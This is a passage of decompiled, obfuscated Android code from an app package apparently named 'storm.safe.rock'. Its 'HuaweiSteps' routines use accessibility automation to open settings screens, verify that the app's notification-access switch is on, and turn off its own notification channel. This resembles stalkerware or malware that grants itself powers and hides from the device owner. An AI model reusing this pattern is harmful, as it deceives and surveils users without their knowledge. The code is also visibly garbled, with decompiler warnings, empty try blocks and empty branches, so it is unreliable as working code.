                    for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText4) {
                        if (accessibilityNodeInfo.isVisibleToUser() && (parent = accessibilityNodeInfo.getParent()) != null) {
                            int childCount = parent.getChildCount();
                            int i18 = 0;
                            while (true) {
                                if (i18 >= childCount) {
                                    break;
                                }
                                AccessibilityNodeInfo child = parent.getChild(i18);
                                if (child != null) {
                                    CharSequence className = child.getClassName();
                                    if (className == null || (string = className.toString()) == null) {
                                        z5 = false;
                                    } else {
                                        z5 = false;
                                        if (AbstractC0779a1.m213652a5(string, "Switch", false)) {
                                            z6 = true;
                                        }
                                        if (z6) {
                                            if (child.isChecked()) {
                                                t60.m214704c5("HuaweiSteps", "[通知使用权] 验证成功：开关已开启");
                                            } else {
                                                t60.m214704c5("HuaweiSteps", "[通知使用权] 开关未开启");
                                            }
                                        }
                                    }
                                    z6 = z5;
                                    if (z6) {
                                    }
                                }
                                try {
                                } catch (Exception e7) {
                                    e = e7;
                                    tz0.m214807a7("[通知使用权] 异常: ", e.getMessage(), "HuaweiSteps");
                                    i = i9;
                                    i7 = i + 1;
                                    i10 = 11;
                                    i11 = 3;
                                    j = 300;
                                    if (i7 < i11) {
                                    }
                                }
                                i18++;
                            }
                        }
                    }
                }
                c0365a2.m212195f2(c0365a2.f55074b2);
                t60.m214704c5("HuaweiSteps", "[通知使用权] 完成");
                return c1351vv;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:68:0x0111, code lost:
    
        r0 = 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:99:0x018e, code lost:
    
        if (p000.b81.m210571b1(100, r3) != r4) goto L111;
     */
    /* JADX WARN: Path cross not found for [B:114:0x00e1, B:73:0x012a], limit reached: 126 */
    /* JADX WARN: Path cross not found for [B:73:0x012a, B:114:0x00e1], limit reached: 126 */
    /* JADX WARN: Removed duplicated region for block: B:114:0x00e1 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:46:0x009f  */
    /* JADX WARN: Removed duplicated region for block: B:74:0x012c A[Catch: Exception -> 0x00ee, TryCatch #1 {Exception -> 0x00ee, blocks: (B:53:0x00e1, B:55:0x00e9, B:60:0x00f4, B:63:0x00fb, B:64:0x00ff, B:66:0x0105, B:69:0x0113, B:72:0x0127, B:74:0x012c, B:79:0x014b), top: B:114:0x00e1 }] */
    /* JADX WARN: Removed duplicated region for block: B:79:0x014b A[Catch: Exception -> 0x00ee, TRY_LEAVE, TryCatch #1 {Exception -> 0x00ee, blocks: (B:53:0x00e1, B:55:0x00e9, B:60:0x00f4, B:63:0x00fb, B:64:0x00ff, B:66:0x0105, B:69:0x0113, B:72:0x0127, B:74:0x012c, B:79:0x014b), top: B:114:0x00e1 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:109:0x019e -> B:110:0x01a7). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:70:0x0123 -> B:72:0x0127). Please report as a decompilation issue!!! */
    /* renamed from: b8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212171b8(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$executeNotificationPermission$1 huaweiSteps$executeNotificationPermission$1;
        C0365a2 c0365a2;
        Exception e;
        int i;
        int i2;
        int i3;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof HuaweiSteps$executeNotificationPermission$1) {
            huaweiSteps$executeNotificationPermission$1 = (HuaweiSteps$executeNotificationPermission$1) continuationImpl;
            int i4 = huaweiSteps$executeNotificationPermission$1.f54060a6;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$executeNotificationPermission$1.f54060a6 = i4 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$executeNotificationPermission$1 = new HuaweiSteps$executeNotificationPermission$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$executeNotificationPermission$1.f54058a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i5 = huaweiSteps$executeNotificationPermission$1.f54060a6;
        int i6 = 2;
        if (i5 == 0) {
            kg1.m213544f4(obj);
            t60.m214704c5("HuaweiSteps", "[通知] ★ 关闭 OFF 频道通知 ★");
            if (m212193f0(this.f55073b1)) {
                t60.m214704c5("HuaweiSteps", "[通知] ⏭️ 已标记完成，跳过");
                return c1351vv;
            }
            c0365a2 = this;
            i5 = 1;
            if (i5 < 3) {
            }
            c0365a2.m212195f2(c0365a2.f55073b1);
            t60.m214704c5("HuaweiSteps", "[通知] ✅ 完成");
            return c1351vv;
        }
        if (i5 == 1) {
            i5 = huaweiSteps$executeNotificationPermission$1.f54055a1;
            c0365a2 = huaweiSteps$executeNotificationPermission$1.f54054a0;
            try {
                kg1.m213544f4(obj);
                i = i5;
                i2 = 1;
                i3 = 0;
            } catch (Exception e2) {
                e = e2;
                tz0.m214807a7("[通知] ❌ 异常: ", e.getMessage(), "HuaweiSteps");
                i5++;
                i6 = 2;
                if (i5 < 3) {
                }
                c0365a2.m212195f2(c0365a2.f55073b1);
                t60.m214704c5("HuaweiSteps", "[通知] ✅ 完成");
                return c1351vv;
            }
            if (i2 < 6) {
            }
            if (i3 == 0) {
            }
            return coroutineSingletons;
        }
        if (i5 == 2) {
            i2 = huaweiSteps$executeNotificationPermission$1.f54057a3;
            int i7 = huaweiSteps$executeNotificationPermission$1.f54056a2;
            i = huaweiSteps$executeNotificationPermission$1.f54055a1;
            C0365a2 c0365a22 = huaweiSteps$executeNotificationPermission$1.f54054a0;
            try {
                kg1.m213544f4(obj);
                i3 = i7;
                c0365a2 = c0365a22;
            } catch (Exception e3) {
                e = e3;
                i5 = i;
                c0365a2 = c0365a22;
                tz0.m214807a7("[通知] ❌ 异常: ", e.getMessage(), "HuaweiSteps");
                i5++;
                i6 = 2;
                if (i5 < 3) {
                }
                c0365a2.m212195f2(c0365a2.f55073b1);
                t60.m214704c5("HuaweiSteps", "[通知] ✅ 完成");
                return c1351vv;
            }
            i2++;
            i6 = 2;
            if (i2 < 6) {
            }
            if (i3 == 0) {
            }
            return coroutineSingletons;
        }
        try {
        } catch (Exception e4) {
            e = e4;
            tz0.m214807a7("[通知] ❌ 异常: ", e.getMessage(), "HuaweiSteps");
            i5++;
            i6 = 2;
            if (i5 < 3) {
            }
            c0365a2.m212195f2(c0365a2.f55073b1);
            t60.m214704c5("HuaweiSteps", "[通知] ✅ 完成");
            return c1351vv;
        }
        if (i5 == 3) {
            i5 = huaweiSteps$executeNotificationPermission$1.f54055a1;
            c0365a2 = huaweiSteps$executeNotificationPermission$1.f54054a0;
            kg1.m213544f4(obj);
            i5++;
            i6 = 2;
            if (i5 < 3) {
                AbstractC0003a2.m44c5("[通知] 第", i5, "次尝试", "HuaweiSteps");
                Intent intent = new Intent("android.settings.CHANNEL_NOTIFICATION_SETTINGS");
                intent.putExtra("android.provider.extra.APP_PACKAGE", c0365a2.f55062a0.getPackageName());
                intent.putExtra("android.provider.extra.CHANNEL_ID", "OFF");
                intent.setFlags(276824064);
                c0365a2.f55063a1.startActivity(intent);
                huaweiSteps$executeNotificationPermission$1.f54054a0 = c0365a2;
                huaweiSteps$executeNotificationPermission$1.f54055a1 = i5;
                huaweiSteps$executeNotificationPermission$1.f54060a6 = 1;
                if (b81.m210571b1(800L, huaweiSteps$executeNotificationPermission$1) != coroutineSingletons) {
                    i = i5;
                    i2 = 1;
                    i3 = 0;
                    if (i2 < 6) {
                        try {
                        } catch (Exception e5) {
                            e = e5;
                            i5 = i;
                            tz0.m214807a7("[通知] ❌ 异常: ", e.getMessage(), "HuaweiSteps");
                            i5++;
                            i6 = 2;
                            if (i5 < 3) {
                            }
                            c0365a2.m212195f2(c0365a2.f55073b1);
                            t60.m214704c5("HuaweiSteps", "[通知] ✅ 完成");
                            return c1351vv;
                        }
                        AccessibilityNodeInfo rootInActiveWindow = c0365a2.f55063a1.getRootInActiveWindow();
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow != null ? rootInActiveWindow.findAccessibilityNodeInfosByText("允许通知") : null;
                        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                            Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                            while (it.hasNext()) {
                                if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                                    break;
                                }
                            }
                        }
                        huaweiSteps$executeNotificationPermission$1.f54054a0 = c0365a2;
                        huaweiSteps$executeNotificationPermission$1.f54055a1 = i;
                        huaweiSteps$executeNotificationPermission$1.f54056a2 = i3;
                        huaweiSteps$executeNotificationPermission$1.f54057a3 = i2;
                        huaweiSteps$executeNotificationPermission$1.f54060a6 = i6;
                        if (b81.m210571b1(500L, huaweiSteps$executeNotificationPermission$1) == coroutineSingletons) {
                        }
                        i2++;
                        i6 = 2;
                        if (i2 < 6) {
                        }
                    }
                    if (i3 == 0) {
                        t60.m214704c5("HuaweiSteps", "[通知] ⚠️ 未进入频道设置页，重试");
                        c0365a2.f55063a1.performGlobalAction(1);
                        huaweiSteps$executeNotificationPermission$1.f54054a0 = c0365a2;
                        huaweiSteps$executeNotificationPermission$1.f54055a1 = i;
                        huaweiSteps$executeNotificationPermission$1.f54060a6 = 3;
                        if (b81.m210571b1(100L, huaweiSteps$executeNotificationPermission$1) != coroutineSingletons) {
                            i5 = i;
                            i5++;
                            i6 = 2;
                            if (i5 < 3) {
                            }
                        }
                    } else {
                        t60.m214704c5("HuaweiSteps", "[通知] 关闭'允许通知'开关...");
                        try {
                        } catch (Exception e6) {
                            e = e6;
                            i5 = i;
                            tz0.m214807a7("[通知] ❌ 异常: ", e.getMessage(), "HuaweiSteps");
                            i5++;
                            i6 = 2;
                            if (i5 < 3) {
                            }
                            c0365a2.m212195f2(c0365a2.f55073b1);
                            t60.m214704c5("HuaweiSteps", "[通知] ✅ 完成");
                            return c1351vv;
                        }
                        if (c0365a2.m212208g6("允许通知", false)) {
                            t60.m214704c5("HuaweiSteps", "[通知] ✅ 渠道已关闭");
                        } else {
                            t60.m214704c5("HuaweiSteps", "[通知] ⚠️ 未找到开关，尝试直接点击...");
                            c0365a2.m212158a1();
                        }
                        huaweiSteps$executeNotificationPermission$1.f54054a0 = c0365a2;
                        huaweiSteps$executeNotificationPermission$1.f54055a1 = i;
                        huaweiSteps$executeNotificationPermission$1.f54060a6 = 4;
                        try {
                        } catch (Exception e7) {
                            e = e7;
                            i5 = i;
                            tz0.m214807a7("[通知] ❌ 异常: ", e.getMessage(), "HuaweiSteps");
                            i5++;
                            i6 = 2;
                            if (i5 < 3) {
                            }
                            c0365a2.m212195f2(c0365a2.f55073b1);
                            t60.m214704c5("HuaweiSteps", "[通知] ✅ 完成");
                            return c1351vv;
                        }
                        if (b81.m210571b1(100L, huaweiSteps$executeNotificationPermission$1) != coroutineSingletons) {
                            i5 = i;
                            c0365a2.f55063a1.performGlobalAction(1);
                            huaweiSteps$executeNotificationPermission$1.f54054a0 = c0365a2;
                            huaweiSteps$executeNotificationPermission$1.f54055a1 = i5;
                            huaweiSteps$executeNotificationPermission$1.f54060a6 = 5;
                        }
                    }
                }
                return coroutineSingletons;
            }
            c0365a2.m212195f2(c0365a2.f55073b1);
            t60.m214704c5("HuaweiSteps", "[通知] ✅ 完成");
            return c1351vv;
        }
        if (i5 != 4) {
            if (i5 != 5) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i8 = huaweiSteps$executeNotificationPermission$1.f54055a1;
            c0365a2 = huaweiSteps$executeNotificationPermission$1.f54054a0;
            kg1.m213544f4(obj);
            c0365a2.m212195f2(c0365a2.f55073b1);
            t60.m214704c5("HuaweiSteps", "[通知] ✅ 完成");
            return c1351vv;
        }
        i5 = huaweiSteps$executeNotificationPermission$1.f54055a1;
        c0365a2 = huaweiSteps$executeNotificationPermission$1.f54054a0;
        kg1.m213544f4(obj);
        try {
        } catch (Exception e8) {
            e = e8;
            tz0.m214807a7("[通知] ❌ 异常: ", e.getMessage(), "HuaweiSteps");
            i5++;
            i6 = 2;
            if (i5 < 3) {
            }
            c0365a2.m212195f2(c0365a2.f55073b1);
            t60.m214704c5("HuaweiSteps", "[通知] ✅ 完成");
            return c1351vv;
        }
        c0365a2.f55063a1.performGlobalAction(1);
        huaweiSteps$executeNotificationPermission$1.f54054a0 = c0365a2;
        huaweiSteps$executeNotificationPermission$1.f54055a1 = i5;
        try {
        } catch (Exception e9) {
            e = e9;
        }
        huaweiSteps$executeNotificationPermission$1.f54060a6 = 5;
        try {
        } catch (Exception e10) {
            e = e10;
            tz0.m214807a7("[通知] ❌ 异常: ", e.getMessage(), "HuaweiSteps");
            i5++;
            i6 = 2;
            if (i5 < 3) {
            }
            c0365a2.m212195f2(c0365a2.f55073b1);
            t60.m214704c5("HuaweiSteps", "[通知] ✅ 完成");
            return c1351vv;
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(11:99|(3:101|(3:103|(1:105)(1:106)|(12:300|108|(1:110)|111|(1:116)|117|118|297|119|120|121|(1:123)(2:124|(1:126)(2:127|(4:129|(1:131)|132|(3:290|134|(1:136)(7:137|138|139|(1:141)|95|267|(0)(0)))(2:144|(1:146)(2:147|(3:284|149|(1:151)(7:152|153|154|(1:156)|95|267|(0)(0)))(7:159|(2:160|(2:162|(2:302|164)(1:166))(3:301|167|(12:274|169|170|(2:172|173)(3:175|176|(2:178|179)(1:180))|174|181|182|293|183|184|295|185)))|165|191|276|220|(3:222|223|(3:286|225|(5:280|227|228|229|(6:232|271|233|(5:235|252|253|292|254)|243|(1:245)(3:246|247|(5:248|252|253|292|254)(0))))(3:242|243|(0)(0)))(0))(5:251|252|253|292|254)))))(1:(0)(0)))))(1:112))|299)(1:113)|114|(0)|117|118|297|119|120|121|(0)(0)) */
    /* JADX WARN: Can't wrap try/catch for region: R(6:202|203|282|204|(10:207|208|209|215|186|(2:188|(1:190)(2:196|(4:199|278|200|(5:214|209|215|186|(0))(0))))|191|276|220|(0)(0))|256) */
    /* JADX WARN: Code restructure failed: missing block: B:210:0x04b4, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:211:0x04b5, code lost:
    
        r5 = r14;
        r7 = r7;
        r18 = r18;
     */
    /* JADX WARN: Code restructure failed: missing block: B:255:0x054a, code lost:
    
        if (p000.b81.m210571b1(100, r3) == r4) goto L256;
     */
    /* JADX WARN: Code restructure failed: missing block: B:264:0x0563, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:265:0x0564, code lost:
    
        r18 = r12 ? 1 : 0;
        r12 = r2;
        r11 = r17;
        r5 = r5;
        r7 = r7;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Not initialized variable reg: 14, insn: 0x00a0: MOVE (r5 I:??[int, float, boolean, short, byte, char, OBJECT, ARRAY]) = (r14 I:??[int, float, boolean, short, byte, char, OBJECT, ARRAY]) (LINE:161), block:B:31:0x009e */
    /* JADX WARN: Not initialized variable reg: 15, insn: 0x00a1: MOVE (r7 I:??[OBJECT, ARRAY]) = (r15 I:??[OBJECT, ARRAY]) (LINE:162), block:B:31:0x009e */
    /* JADX WARN: Removed duplicated region for block: B:101:0x0204  */
    /* JADX WARN: Removed duplicated region for block: B:113:0x0262  */
    /* JADX WARN: Removed duplicated region for block: B:116:0x0267 A[Catch: Exception -> 0x004f, TryCatch #1 {Exception -> 0x004f, blocks: (B:13:0x0042, B:84:0x0163, B:87:0x0190, B:89:0x0198, B:92:0x01b3, B:96:0x01d3, B:99:0x01ed, B:103:0x0209, B:105:0x0211, B:108:0x021b, B:111:0x0231, B:116:0x0267, B:117:0x026c, B:121:0x027c, B:124:0x0284, B:127:0x0297, B:129:0x02a6, B:132:0x02c1, B:139:0x02f0, B:144:0x0301, B:147:0x0315, B:154:0x034b, B:159:0x0358, B:162:0x0374, B:164:0x037c, B:166:0x039b, B:167:0x039e, B:172:0x03b3, B:178:0x03cf, B:112:0x025e, B:36:0x00bc, B:39:0x00c8, B:42:0x00d4, B:45:0x00e0, B:49:0x00ec, B:52:0x00f6, B:55:0x0100, B:58:0x010a, B:66:0x0125, B:69:0x012e, B:72:0x0137, B:75:0x0140), top: B:273:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:123:0x0282  */
    /* JADX WARN: Removed duplicated region for block: B:124:0x0284 A[Catch: Exception -> 0x004f, PHI: r2 r5 r7 r12 r17
      0x0284: PHI (r2v19 vv) = (r2v20 vv), (r2v0 vv) binds: [B:122:0x0280, B:59:0x010d] A[DONT_GENERATE, DONT_INLINE]
      0x0284: PHI (r5v27 int) = (r5v92 int), (r5v93 int) binds: [B:122:0x0280, B:59:0x010d] A[DONT_GENERATE, DONT_INLINE]
      0x0284: PHI (r7v23 com.storm.safe.rock.service.modules.yw5xud.a2) = (r7v94 com.storm.safe.rock.service.modules.yw5xud.a2), (r7v95 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:122:0x0280, B:59:0x010d] A[DONT_GENERATE, DONT_INLINE]
      0x0284: PHI (r12v28 boolean) = (r12v29 boolean), (r12v57 boolean) binds: [B:122:0x0280, B:59:0x010d] A[DONT_GENERATE, DONT_INLINE]
      0x0284: PHI (r17v9 java.lang.String) = (r17v10 java.lang.String), (r17v0 java.lang.String) binds: [B:122:0x0280, B:59:0x010d] A[DONT_GENERATE, DONT_INLINE], TryCatch #1 {Exception -> 0x004f, blocks: (B:13:0x0042, B:84:0x0163, B:87:0x0190, B:89:0x0198, B:92:0x01b3, B:96:0x01d3, B:99:0x01ed, B:103:0x0209, B:105:0x0211, B:108:0x021b, B:111:0x0231, B:116:0x0267, B:117:0x026c, B:121:0x027c, B:124:0x0284, B:127:0x0297, B:129:0x02a6, B:132:0x02c1, B:139:0x02f0, B:144:0x0301, B:147:0x0315, B:154:0x034b, B:159:0x0358, B:162:0x0374, B:164:0x037c, B:166:0x039b, B:167:0x039e, B:172:0x03b3, B:178:0x03cf, B:112:0x025e, B:36:0x00bc, B:39:0x00c8, B:42:0x00d4, B:45:0x00e0, B:49:0x00ec, B:52:0x00f6, B:55:0x0100, B:58:0x010a, B:66:0x0125, B:69:0x012e, B:72:0x0137, B:75:0x0140), top: B:273:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:126:0x0295  */
    /* JADX WARN: Removed duplicated region for block: B:127:0x0297 A[Catch: Exception -> 0x004f, PHI: r2 r5 r7 r12 r17
      0x0297: PHI (r2v18 vv) = (r2v19 vv), (r2v0 vv) binds: [B:125:0x0293, B:56:0x0103] A[DONT_GENERATE, DONT_INLINE]
      0x0297: PHI (r5v26 int) = (r5v94 int), (r5v95 int) binds: [B:125:0x0293, B:56:0x0103] A[DONT_GENERATE, DONT_INLINE]
      0x0297: PHI (r7v22 com.storm.safe.rock.service.modules.yw5xud.a2) = (r7v96 com.storm.safe.rock.service.modules.yw5xud.a2), (r7v97 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:125:0x0293, B:56:0x0103] A[DONT_GENERATE, DONT_INLINE]
      0x0297: PHI (r12v27 boolean) = (r12v28 boolean), (r12v58 boolean) binds: [B:125:0x0293, B:56:0x0103] A[DONT_GENERATE, DONT_INLINE]
      0x0297: PHI (r17v8 java.lang.String) = (r17v9 java.lang.String), (r17v0 java.lang.String) binds: [B:125:0x0293, B:56:0x0103] A[DONT_GENERATE, DONT_INLINE], TryCatch #1 {Exception -> 0x004f, blocks: (B:13:0x0042, B:84:0x0163, B:87:0x0190, B:89:0x0198, B:92:0x01b3, B:96:0x01d3, B:99:0x01ed, B:103:0x0209, B:105:0x0211, B:108:0x021b, B:111:0x0231, B:116:0x0267, B:117:0x026c, B:121:0x027c, B:124:0x0284, B:127:0x0297, B:129:0x02a6, B:132:0x02c1, B:139:0x02f0, B:144:0x0301, B:147:0x0315, B:154:0x034b, B:159:0x0358, B:162:0x0374, B:164:0x037c, B:166:0x039b, B:167:0x039e, B:172:0x03b3, B:178:0x03cf, B:112:0x025e, B:36:0x00bc, B:39:0x00c8, B:42:0x00d4, B:45:0x00e0, B:49:0x00ec, B:52:0x00f6, B:55:0x0100, B:58:0x010a, B:66:0x0125, B:69:0x012e, B:72:0x0137, B:75:0x0140), top: B:273:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:129:0x02a6 A[Catch: Exception -> 0x004f, TryCatch #1 {Exception -> 0x004f, blocks: (B:13:0x0042, B:84:0x0163, B:87:0x0190, B:89:0x0198, B:92:0x01b3, B:96:0x01d3, B:99:0x01ed, B:103:0x0209, B:105:0x0211, B:108:0x021b, B:111:0x0231, B:116:0x0267, B:117:0x026c, B:121:0x027c, B:124:0x0284, B:127:0x0297, B:129:0x02a6, B:132:0x02c1, B:139:0x02f0, B:144:0x0301, B:147:0x0315, B:154:0x034b, B:159:0x0358, B:162:0x0374, B:164:0x037c, B:166:0x039b, B:167:0x039e, B:172:0x03b3, B:178:0x03cf, B:112:0x025e, B:36:0x00bc, B:39:0x00c8, B:42:0x00d4, B:45:0x00e0, B:49:0x00ec, B:52:0x00f6, B:55:0x0100, B:58:0x010a, B:66:0x0125, B:69:0x012e, B:72:0x0137, B:75:0x0140), top: B:273:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:133:0x02c7 A[PHI: r0 r2 r5 r7 r12 r17
      0x02c7: PHI (r0v65 boolean) = (r0v74 boolean), (r0v77 boolean) binds: [B:132:0x02c1, B:128:0x02a4] A[DONT_GENERATE, DONT_INLINE]
      0x02c7: PHI (r2v16 vv) = (r2v17 vv), (r2v18 vv) binds: [B:132:0x02c1, B:128:0x02a4] A[DONT_GENERATE, DONT_INLINE]
      0x02c7: PHI (r5v24 int) = (r5v98 int), (r5v99 int) binds: [B:132:0x02c1, B:128:0x02a4] A[DONT_GENERATE, DONT_INLINE]
      0x02c7: PHI (r7v20 ??) = (r7v100 ??), (r7v101 ??) binds: [B:132:0x02c1, B:128:0x02a4] A[DONT_GENERATE, DONT_INLINE]
      0x02c7: PHI (r12v25 boolean) = (r12v26 boolean), (r12v27 boolean) binds: [B:132:0x02c1, B:128:0x02a4] A[DONT_GENERATE, DONT_INLINE]
      0x02c7: PHI (r17v6 java.lang.String) = (r17v7 java.lang.String), (r17v8 java.lang.String) binds: [B:132:0x02c1, B:128:0x02a4] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:141:0x02fa  */
    /* JADX WARN: Removed duplicated region for block: B:144:0x0301 A[Catch: Exception -> 0x004f, TryCatch #1 {Exception -> 0x004f, blocks: (B:13:0x0042, B:84:0x0163, B:87:0x0190, B:89:0x0198, B:92:0x01b3, B:96:0x01d3, B:99:0x01ed, B:103:0x0209, B:105:0x0211, B:108:0x021b, B:111:0x0231, B:116:0x0267, B:117:0x026c, B:121:0x027c, B:124:0x0284, B:127:0x0297, B:129:0x02a6, B:132:0x02c1, B:139:0x02f0, B:144:0x0301, B:147:0x0315, B:154:0x034b, B:159:0x0358, B:162:0x0374, B:164:0x037c, B:166:0x039b, B:167:0x039e, B:172:0x03b3, B:178:0x03cf, B:112:0x025e, B:36:0x00bc, B:39:0x00c8, B:42:0x00d4, B:45:0x00e0, B:49:0x00ec, B:52:0x00f6, B:55:0x0100, B:58:0x010a, B:66:0x0125, B:69:0x012e, B:72:0x0137, B:75:0x0140), top: B:273:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:156:0x0351  */
    /* JADX WARN: Removed duplicated region for block: B:159:0x0358 A[Catch: Exception -> 0x004f, TryCatch #1 {Exception -> 0x004f, blocks: (B:13:0x0042, B:84:0x0163, B:87:0x0190, B:89:0x0198, B:92:0x01b3, B:96:0x01d3, B:99:0x01ed, B:103:0x0209, B:105:0x0211, B:108:0x021b, B:111:0x0231, B:116:0x0267, B:117:0x026c, B:121:0x027c, B:124:0x0284, B:127:0x0297, B:129:0x02a6, B:132:0x02c1, B:139:0x02f0, B:144:0x0301, B:147:0x0315, B:154:0x034b, B:159:0x0358, B:162:0x0374, B:164:0x037c, B:166:0x039b, B:167:0x039e, B:172:0x03b3, B:178:0x03cf, B:112:0x025e, B:36:0x00bc, B:39:0x00c8, B:42:0x00d4, B:45:0x00e0, B:49:0x00ec, B:52:0x00f6, B:55:0x0100, B:58:0x010a, B:66:0x0125, B:69:0x012e, B:72:0x0137, B:75:0x0140), top: B:273:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:188:0x0434 A[Catch: Exception -> 0x0444, TryCatch #15 {Exception -> 0x0444, blocks: (B:185:0x0424, B:188:0x0434, B:190:0x043c, B:196:0x044b), top: B:295:0x0424 }] */
    /* JADX WARN: Removed duplicated region for block: B:202:0x0492 A[Catch: Exception -> 0x04b7, TRY_LEAVE, TryCatch #5 {Exception -> 0x04b7, blocks: (B:200:0x048e, B:202:0x0492), top: B:278:0x048e }] */
    /* JADX WARN: Removed duplicated region for block: B:214:0x04ba  */
    /* JADX WARN: Removed duplicated region for block: B:222:0x04db A[Catch: Exception -> 0x0538, TRY_LEAVE, TryCatch #4 {Exception -> 0x0538, blocks: (B:220:0x04d3, B:222:0x04db), top: B:276:0x04d3 }] */
    /* JADX WARN: Removed duplicated region for block: B:235:0x0509 A[Catch: Exception -> 0x050f, TryCatch #0 {Exception -> 0x050f, blocks: (B:233:0x0501, B:235:0x0509, B:252:0x053c, B:243:0x051e, B:247:0x0533), top: B:271:0x0501 }] */
    /* JADX WARN: Removed duplicated region for block: B:245:0x0530  */
    /* JADX WARN: Removed duplicated region for block: B:246:0x0531  */
    /* JADX WARN: Removed duplicated region for block: B:248:0x0536  */
    /* JADX WARN: Removed duplicated region for block: B:251:0x053b  */
    /* JADX WARN: Removed duplicated region for block: B:268:0x0582  */
    /* JADX WARN: Removed duplicated region for block: B:284:0x0320 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:286:0x04e6 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:290:0x02c9 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:83:0x015e  */
    /* JADX WARN: Removed duplicated region for block: B:89:0x0198 A[Catch: Exception -> 0x004f, TryCatch #1 {Exception -> 0x004f, blocks: (B:13:0x0042, B:84:0x0163, B:87:0x0190, B:89:0x0198, B:92:0x01b3, B:96:0x01d3, B:99:0x01ed, B:103:0x0209, B:105:0x0211, B:108:0x021b, B:111:0x0231, B:116:0x0267, B:117:0x026c, B:121:0x027c, B:124:0x0284, B:127:0x0297, B:129:0x02a6, B:132:0x02c1, B:139:0x02f0, B:144:0x0301, B:147:0x0315, B:154:0x034b, B:159:0x0358, B:162:0x0374, B:164:0x037c, B:166:0x039b, B:167:0x039e, B:172:0x03b3, B:178:0x03cf, B:112:0x025e, B:36:0x00bc, B:39:0x00c8, B:42:0x00d4, B:45:0x00e0, B:49:0x00ec, B:52:0x00f6, B:55:0x0100, B:58:0x010a, B:66:0x0125, B:69:0x012e, B:72:0x0137, B:75:0x0140), top: B:273:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:94:0x01c7  */
    /* JADX WARN: Removed duplicated region for block: B:96:0x01d3 A[Catch: Exception -> 0x004f, TryCatch #1 {Exception -> 0x004f, blocks: (B:13:0x0042, B:84:0x0163, B:87:0x0190, B:89:0x0198, B:92:0x01b3, B:96:0x01d3, B:99:0x01ed, B:103:0x0209, B:105:0x0211, B:108:0x021b, B:111:0x0231, B:116:0x0267, B:117:0x026c, B:121:0x027c, B:124:0x0284, B:127:0x0297, B:129:0x02a6, B:132:0x02c1, B:139:0x02f0, B:144:0x0301, B:147:0x0315, B:154:0x034b, B:159:0x0358, B:162:0x0374, B:164:0x037c, B:166:0x039b, B:167:0x039e, B:172:0x03b3, B:178:0x03cf, B:112:0x025e, B:36:0x00bc, B:39:0x00c8, B:42:0x00d4, B:45:0x00e0, B:49:0x00ec, B:52:0x00f6, B:55:0x0100, B:58:0x010a, B:66:0x0125, B:69:0x012e, B:72:0x0137, B:75:0x0140), top: B:273:0x0033 }] */
    /* JADX WARN: Type inference failed for: r12v15, types: [int] */
    /* JADX WARN: Type inference failed for: r12v24 */
    /* JADX WARN: Type inference failed for: r12v9 */
    /* JADX WARN: Type inference failed for: r14v6, types: [java.lang.StringBuilder] */
    /* JADX WARN: Type inference failed for: r18v0 */
    /* JADX WARN: Type inference failed for: r18v1 */
    /* JADX WARN: Type inference failed for: r18v2 */
    /* JADX WARN: Type inference failed for: r18v23 */
    /* JADX WARN: Type inference failed for: r18v25 */
    /* JADX WARN: Type inference failed for: r18v26 */
    /* JADX WARN: Type inference failed for: r18v27 */
    /* JADX WARN: Type inference failed for: r18v28 */
    /* JADX WARN: Type inference failed for: r18v29 */
    /* JADX WARN: Type inference failed for: r18v30 */
    /* JADX WARN: Type inference failed for: r18v33 */
    /* JADX WARN: Type inference failed for: r18v34 */
    /* JADX WARN: Type inference failed for: r18v35 */
    /* JADX WARN: Type inference failed for: r18v4 */
    /* JADX WARN: Type inference failed for: r18v5 */
    /* JADX WARN: Type inference failed for: r18v51 */
    /* JADX WARN: Type inference failed for: r18v52 */
    /* JADX WARN: Type inference failed for: r18v57 */
    /* JADX WARN: Type inference failed for: r18v6 */
    /* JADX WARN: Type inference failed for: r18v8 */
    /* JADX WARN: Type inference failed for: r18v9 */
    /* JADX WARN: Type inference failed for: r5v2 */
